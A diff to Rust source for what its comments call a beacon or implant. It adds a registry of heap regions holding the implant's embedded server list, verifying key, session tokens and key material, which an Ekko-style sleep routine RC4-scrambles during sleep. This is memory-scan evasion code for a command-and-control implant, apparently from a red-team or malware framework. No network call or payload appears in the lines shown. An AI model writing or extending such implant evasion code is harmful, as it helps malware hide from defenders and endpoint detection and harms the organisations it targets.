@@ -29,6 +29,32 @@ pub(crate) fn secure_clear(buf: &mut [u8]) {
     std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
 }
 
+/// Sleep 2.0 sensitive-heap registry (ABR-T006): stable-address buffers
+/// whose plaintext must not sit in memory while the beacon sleeps — the
+/// embedded configuration (server list, verifying key), session tokens,
+/// key material. Regions are RC4-scrambled for the whole sleep window by
+/// `sleep::EkkoSleep::sleep` and restored on wake. Registrations must
+/// outlive the implant (Box::leak-style storage), and a region may only
+/// be registered once — the cipher assumes the set is stable per cycle.
+static SENSITIVE: std::sync::Mutex<Vec<(usize, usize)>> = std::sync::Mutex::new(Vec::new());
+
+/// Registers a stable heap region for sleep-time encryption.
+pub fn register_sensitive(ptr: usize, len: usize) {
+    if ptr == 0 || len == 0 {
+        return;
+    }
+    if let Ok(mut regions) = SENSITIVE.lock() {
+        if !regions.contains(&(ptr, len)) {
+            regions.push((ptr, len));
+        }
+    }
+}
+
+/// Snapshot of the registered regions (called by the sleep cycle).
+pub(crate) fn sensitive_regions() -> Vec<(usize, usize)> {
+    SENSITIVE.lock().map(|r| r.clone()).unwrap_or_default()
+}
+
 use std::time::Duration;
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
